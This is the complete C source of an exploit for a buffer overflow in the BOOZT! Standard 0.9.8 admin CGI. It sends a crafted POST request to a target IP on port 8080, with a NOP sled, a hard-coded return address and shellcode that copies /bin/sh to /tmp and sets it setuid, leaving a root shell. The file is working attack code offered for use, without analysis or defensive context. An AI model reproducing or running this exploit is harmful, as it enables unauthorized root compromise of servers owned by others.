/* -----------------------------------------

        BOOZT! Standard 0.9.8 CGI vulnerability exploit

        Rafael San Miguel Carrasco

        rsanmcar@alum.uax.es

   -----------------------------------------  */


#include <netinet/in.h>
#define PORT 8080
#define BUFLEN 1597
#define RET 0xbffff297
#define NOP 0x90

int main (int argc, char **argv) {

        int sockfd, i, cont;
        struct sockaddr_in dest;
        int html_len = 15;
        char cgicontent[2048];
        char buf[BUFLEN];

        char shellcode[]=
               
"\x29\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x02\xeb\x05\x29\xc0\x40\xcd\x80\x29\xc0\x29\xdb\x29\xc9"
               
"\xb0\x46\xcd\x80\xeb\x2a\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36\x8d\x5e\x0b\x89\x5e\x3a\x29"
               
"\xc0\x88\x46\x07\x88\x46\x0a\x88\x46\x31\x89\x46\x3e\x87\xf3\xb0\x0b\x8d\x4b\x32\x8d\x53\x3e"
               
"\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2d\x63\x20\x63\x70\x20\x2f\x62\x69\x6e"
               
"\x2f\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x34\x37\x35\x35\x20"
                "\x2f\x74\x6d\x70\x2f\x73\x68";

        char *html[15] = {
                "POST /cgi-bin/boozt/admin/index.cgi HTTP/1.0\n",
                "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
*/*\n",
                "Referer:
http://10.0.0.1:8080/cgi-bin/boozt/admin/index.cgi?section=5&input=1\n",
                "Accept-Language: es, en\n",
                "Content-Type: application/x-www-form-urlencoded\n",
                "UA-pixels: 640x480\n",
                "UA-color: color8\n",
                "UA-OS: Windows 95\n",
                "UA-CPU: x86\n",
                "User-Agent: Mozilla/2.0 (compatible; MSIE 3.0; Windows 95)\n",
                "Host: 10.0.0.1:8080\n",
                "Connection: Keep-Alive\n",
                "Content-Length: 1776\n",
                "Pragma: No-Cache\n",
                "\n",
        };

        if (argc < 2) {
                printf ("usage: %s <IP>\n", argv[0]);
                exit (-1);
        }

        printf ("----------\n");
        printf (" BOOZT! Standard exploit\n");
        printf ("----------\n");
        printf ("Rafael San Miguel Carrasco (_kiss_)\n");
        printf ("rsanmcar@alum.uax.es\n");
        printf ("----------\n");

        for (i = 0; i < BUFLEN; i+=4)
                *( (long *) &buf[i]) = RET;

        for (i = 0; i < (BUFLEN - 16); i++)
                buf[i] = NOP;


        cont = 0;

        for (i = (BUFLEN - strlen (shellcode) - 16); i < (BUFLEN - 16); i++)
                buf[i] = shellcode [cont++];

        strcpy (cgicontent, "name=");
        strncat (cgicontent, buf, sizeof (buf));
        strcat (cgicontent,
"&target=&alt_text=&id_size=1&type=image&source=&source_path=Browse...&source_flash=&source_flash_path=Browse...&script_name=&input=
1&section=5&sent=1&submit=Create+New+Banner");

        printf ("connecting ...\n");

        if ( (sockfd = socket (AF_INET, SOCK_STREAM, 0)) < 0) {
                perror ("socket");
                exit (-1);
        }

        bzero (&dest, sizeof (dest));
        dest.sin_family = AF_INET;
        dest.sin_port = htons (PORT);
        dest.sin_addr.s_addr = inet_addr (argv[1]);

        if (connect (sockfd, &dest, sizeof (dest)) < 0) {
                perror ("connect");
                exit (-1);
        }

        printf ("connected. sending buffer ...\n");

        for (i = 0; i < html_len; i++) {

                if (write (sockfd, html[i], strlen(html[i])) < strlen(html[i]))
{
                        perror ("write");
                        exit (-1);
                }
        }

        if (write (sockfd, cgicontent, strlen(cgicontent)) < strlen(cgicontent))
{
                perror ("write cgicontent");
                exit (-1);
        }

        if (close (sockfd) < 0) {
                perror ("close");
                exit (-1);
        }

        printf ("there should be a rootshell in /tmp.\n\n");

        return 0;
}